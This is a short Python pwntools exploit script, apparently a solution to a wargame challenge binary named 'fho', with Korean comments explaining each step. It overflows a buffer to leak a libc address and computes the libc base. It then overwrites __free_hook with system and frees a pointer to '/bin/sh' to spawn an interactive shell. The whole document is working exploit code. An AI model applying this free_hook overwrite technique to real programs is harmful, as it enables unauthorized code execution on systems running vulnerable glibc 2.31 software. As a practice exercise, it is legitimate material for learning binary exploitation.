from pwn import *

p = process("./fho")

e = ELF("./fho")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")


buf = b'A' * (64 + 8)
p.sendafter("Buf: " ,buf)
p.recvuntil(buf)
libc_start_main = p.recvline()
#print(len(libc_start_main)) => 7 (\n포함) 
# 원래 8byte이다. 처음 2 byte가 \x00인..
# 근데 packing 되어 있으니까 마지막 2bytes가 \x00이고 이건 출력이 안됨
# 그래서 \n포함 7바이트 나옴
# 개행 떼고 \x00두개 붙인다음 다시 unpacking해서 base계산에 이용할 수 있다.
#print(libc_start_main)
libc_start_main = libc_start_main[:-1]
libc_start_main += b"\x00" * 2
libc_start_main = u64(libc_start_main)

libc_base = libc_start_main -(libc.symbols["__libc_start_main"] + 243)
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh")) 
#next(libc.search(?)) == ?의 offset

# scanf에 int형인 free_hook, system, binsh을 그대로 보내면
# Error난다. int형 주지 말래.. 그래서 str으로 형변환 한다.
p.sendlineafter("To write: ", str(free_hook))
p.sendlineafter("With: ", str(system))
# [3] Exploit
p.sendlineafter("To free: ", str(binsh))

p.interactive()